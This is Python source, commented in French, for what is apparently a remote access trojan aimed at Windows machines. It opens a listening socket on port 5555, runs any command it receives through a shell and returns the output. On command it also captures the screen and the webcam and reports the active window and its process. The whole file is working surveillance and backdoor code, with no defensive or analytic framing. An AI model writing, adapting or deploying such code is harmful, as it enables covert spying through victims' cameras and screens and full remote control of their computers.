import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
import cv2

host = "0.0.0.0"
port = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(f"[*] En attente de connexion sur {host}:{port}")

async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    return screenshot_path, filename

def take_camshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_CAM_{timestamp}.png"
    camshot_path = os.path.join("C:/Users/Public/Downloads", filename)

    try:
        # Accéder à la caméra (essayer 0, 1, 2, ... jusqu'à ce que la caméra fonctionne)
        cap = cv2.VideoCapture(0)  # Essaie avec 0, 1, 2, etc.
        
        if not cap.isOpened():
            return None, "Erreur: Caméra inaccessible."
        
        ret, frame = cap.read()
        cap.release()

        if ret:
            # Sauvegarder l'image capturée
            cv2.imwrite(camshot_path, frame)
            return camshot_path, filename
        else:
            return None, "Erreur: Échec de capture."
    except Exception as e:
        return None, f"Erreur: {e}"

async def handle_client(conn):
    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                file_size = len(data)
                conn.sendall(struct.pack("!I", file_size))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)

            elif command == "CAMSHOT":
                camshot_path, filename = take_camshot()
                if camshot_path:
                    with open(camshot_path, "rb") as file:
                        data = file.read()
                    file_size = len(data)
                    conn.sendall(struct.pack("!I", file_size))
                    conn.sendall(filename.encode().ljust(100))
                    conn.sendall(data)
                else:
                    conn.sendall(f"Erreur: {filename}".encode())

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            else:
                result = await execute_command(command)
                conn.send(result.encode() if result else b"Commande executee sans resultat.\n")
        except Exception:
            break

    print("[-] Connexion fermée.")
    conn.close()

def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur lors de la récupération des informations: {str(e)}"

async def main():
    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion établie avec {addr[0]}")
        await handle_client(conn)

asyncio.run(main())